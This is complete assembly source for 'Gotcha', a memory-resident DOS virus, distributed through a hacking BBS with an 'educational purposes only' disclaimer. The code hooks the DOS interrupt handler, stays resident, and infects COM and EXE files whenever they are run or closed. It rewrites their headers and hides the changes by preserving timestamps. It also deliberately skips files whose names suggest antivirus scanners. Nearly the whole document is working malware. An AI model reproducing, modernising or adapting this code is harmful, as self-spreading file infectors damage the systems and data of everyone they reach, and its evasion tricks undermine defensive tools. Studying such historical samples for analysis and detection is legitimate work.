;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;****************************************************************************
;*  Gotcha    version 17
;*
;*  Compile with MASM 4.0
;*  (other assemblers will probably not produce the same result)
;*
;*  Disclaimer:
;*  This file is only for educational purposes. The author takes no
;*  responsibility for anything anyone does with this file. Do not
;*  modify this file!
;****************************************************************************

                .RADIX  16

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing


VERSION         equ     17d
FILELEN         equ     end - start
RESPAR          equ     (FILELEN/16d) + 18d
BUFLEN          equ     18
ENVLEN          equ     signature- envstring        
COMSIGN         equ     0
EXESIGN         equ     1


;****************************************************************************
;*              Dummy program (infected)
;****************************************************************************

                org     0100

begin:          db      0E9, BUFLEN+1, 0        ;jump to virus entry


;****************************************************************************
;*              Data
;****************************************************************************

                org     0103

start:
buffer          db      0CDh, 20                ;original code
                db      (BUFLEN-2) dup (?)
comexe          db      COMSIGN                 ;dummy program is a COM program


;****************************************************************************
;*              Install the virus
;****************************************************************************

                call    start2
start2:         pop     si
                sub     si,(BUFLEN+4)           ;si = begin virus
                mov     di,0100
                cld

                cmp     byte ptr cs:[si+BUFLEN],COMSIGN
                jz      entryC

entryE:         mov     ax,ds                   ;calculate CS
                add     ax,10
                add     ax,cs:[si+16]
                push    ax                      ;push new CS on stack
                push    cs:[si+14]              ;push new IP on stack
                jmp     short entcheck

entryC:         push    cs                      ;push new CS on stack
                push    di                      ;push new IP on stack
                push    di
                push    si
                movsw                           ;restore old file-begin
                movsb
                pop     si
                pop     di

entcheck:       mov     ax,0DADA                ;already installed?
                int     21
                cmp     ah,0A5
                je      entstop

                mov     ax,3000                 ;test DOS version >= 3.1?
                int     21
                xchg    ah,al
                cmp     ax,030A
                jb      entstop

                push    ds
                push    es

                mov     ax,ds                   ;adjust memory-size
                dec     ax
                mov     ds,ax
                cmp     byte ptr ds:[0000],5A
                jnz     cancel
                mov     ax,ds:[0003]
                sub     ax,low RESPAR
                jb      cancel
                mov     ds:[0003],ax
                sub     word ptr ds:[0012],low RESPAR

                mov     es,ds:[0012]            ;copy program to top
                push    cs
                pop     ds
                mov     cx,FILELEN
        rep     movsb

                mov     ds,cx                   ;get original int21 vector
                mov     si,4*21
                movsw                           ;move it to the end
                movsw

                push    es                      ;set vector to new handler
                pop     ds
                mov     dx,offset ni21-3
                mov     ax,2521
                int     21

cancel:         pop     es
                pop     ds

entstop:        db      0CBh                    ;retf


;****************************************************************************
;*              Interupt 24 handler
;****************************************************************************

ni24:           mov     al,3
                iret


;****************************************************************************
;*              Interupt 21 handler
;****************************************************************************

ni21:           pushf

                cmp     ax,0DADA                ;install-check ?
                je      do_DADA

                push    dx
                push    cx
                push    bx
                push    ax
                push    si
                push    di
                push    ds
                push    es

                cmp     ah,3E                   ;close ?
                jne     vvv
                mov     ah,45                   ;duplicate handle
                jmp     short doit

vvv:            cmp     ax,4B00                 ;execute ?
                jne     exit
                mov     ah,3Dh                  ;open the file

doit:           int     21
                jc      exit
                xchg    ax,bx
                call    infect

exit:           pop     es
                pop     ds
                pop     di
                pop     si
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                popf

org21:          jmp     dword ptr cs:[oi21-3]   ;call to old int-handler


do_DADA:        mov     ax,0A500+VERSION        ;return a signature
                popf
                iret


;****************************************************************************
;*              Close the file
;****************************************************************************

close:          mov     ah,3E                   ;close the file
                pushf
                push    cs
                call    org21
                ret


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                push    bx
                mov     ah,62                   ;get segment-adres of PSP
                int     21
                mov     ds,bx                   ;get seg-adres of environment
                mov     es,ds:[002C]
                xor     di,di
                pop     bx
                push    cs
                pop     ds
                
envloop:        mov     si,offset envstring-3   ;check the environment
                mov     cx,ENVLEN
        repz    cmpsb
                jz      close                   ;exit if item found
                dec     di                      ;goto next item
                xor     al,al
                mov     ch,0FF
        repnz   scasb
                cmp     byte ptr es:[di],0      ;finnished environment?
                jnz     envloop

                mov     ax,3300                 ;get ctrl-break flag
                int     21
                push    dx

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     dx,bx
                mov     ax,3524                 ;get int24 vector
                int     21
                push    bx
                push    es
                mov     bx,dx

                push    cs
                pop     ds

                mov     dx,offset ni24          ;set int24 vector
                mov     ah,25
                push    ax
                int     21

                mov     ax,1220                 ;get file-table entry
                push    bx
                push    ax
                int     2F
                mov     bl,es:[di]
                pop     ax
                sub     al,0A
                int     2F
                pop     bx

                push    es
                pop     ds

                push    [di+2]                  ;save attribute & open-mode
                push    [di+4]

                cmp     word ptr [di+28],'XE'   ;check extension
                jne     not_exe
                cmp     byte ptr [di+2A],'E'
                jmp     short check

not_exe:        cmp     word ptr [di+28],'OC'
                jne     close1v
                cmp     byte ptr [di+2A],'M'
check:          je      check_name
close1v:        jmp     close1

check_name:     cmp     byte ptr [di+20],'V'    ;name is V*.* ?
                je      close1v
                cmp     byte ptr [di+20],'F'    ;name is F*.* ?
                je      close1v

                mov     cx,7                    ;name is *SC*.* ?
                mov     ax,'CS'
                push    di
                add     di,21
SCloop:         dec     di
                scasw
                loopnz  SCloop
                pop     di
                je      close1v

                mov     byte ptr [di+2],2       ;open for read/write
                mov     byte ptr [di+4],0       ;clear attributes
                call    getlen
                mov     cl,3
                sub     ax,cx                   ;goto signature
                sbb     dx,0
                call    goto
                push    ax                      ;save old offset
                push    dx

                push    cs
                pop     ds

                mov     si,0100                 ;read signature
                mov     dx,si
                mov     ah,3F
                int     21

                cmp     word ptr [si],'!A'      ;already infected?
                je      close2v

                call    gotobegin

                mov     cl,BUFLEN               ;read begin
                mov     dx,si
                mov     ah,3F
                int     21

                cmp     word ptr [si],5A4Dh     ;EXE ?
                jz      do_EXE
                cmp     word ptr [si],4D5A
                jz      do_EXE

do_COM:         mov     byte ptr [si+BUFLEN],COMSIGN

                cmp     byte ptr es:[di+12],0FC ;check length
                jnb     close2
                cmp     byte ptr es:[di+12],3
                jbe     close2

                call    writeprog               ;write program to end of file
                jnz     close2

                mov     byte ptr [si],0E9h      ;JMP xxxx'
                call    getoldlen
                add     ax,(BUFLEN-2)
                mov     word ptr [si+1],ax

                jmp     short done
close2v:        jmp     short close2

do_EXE:         mov     byte ptr [si+BUFLEN],EXESIGN

                call    writeprog               ;write program to end of file
                jnz     close2

                call    getlen                  ;calculate new length 
                mov     cx,0200                 ;put new length in header
                div     cx
                inc     ax
                mov     word ptr [si+4],ax
                mov     word ptr [si+2],dx

                call    getoldlen               ;calculate new CS & IP
                mov     cx,0010
                div     cx
                sub     ax,word ptr [si+8]
                mov     word ptr [si+16],ax     ;put CS in header
                add     dx,BUFLEN+1
                mov     word ptr [si+14],dx     ;put IP in header


done:           call    gotobegin
                mov     cx,BUFLEN               ;write new begin
                mov     dx,si
                mov     ah,40
                int     21

close2:         push    es
                pop     ds

                pop     dx                      ;restore old offset in file
                pop     ax
                call    goto

                or      byte ptr [di+6],40      ;no time-change

close1:         call    close

                or      byte ptr [di+5],40      ;no EOF on next close
                pop     [di+4]                  ;restore attribute & open-mode
                pop     [di+2]

                pop     ax                      ;restore int24 vector
                pop     ds
                pop     dx
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                ret


;****************************************************************************
;*              Get original length of program
;****************************************************************************

getoldlen:      call    getlen
                sub     ax,FILELEN
                sbb     dx,0
                ret


;****************************************************************************
;*              Get length of program
;****************************************************************************

getlen:         mov     ax,es:[di+11]
                mov     dx,es:[di+13]
                ret


;****************************************************************************
;*              Goto new offset DX:AX
;****************************************************************************

gotobegin:      xor     ax,ax
                cwd
goto:           xchg    ax,es:[di+15]
                xchg    dx,es:[di+17]
                ret


;****************************************************************************
;*              Write virus to the file
;****************************************************************************

writeprog:      call    getlen
                call    goto

                mov     cx,FILELEN              ;write virus
                mov     dx,si
                mov     ah,40
                int     21
                cmp     cx,ax                   ;are all bytes written?
                ret


;****************************************************************************
;*              Text and Signature
;****************************************************************************

envstring       db      'E=mcý',0

signature:      db      'GOTCHA!',0             ;I have got you!  :-)

oi21:
end:

cseg            ends
                end     begin

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

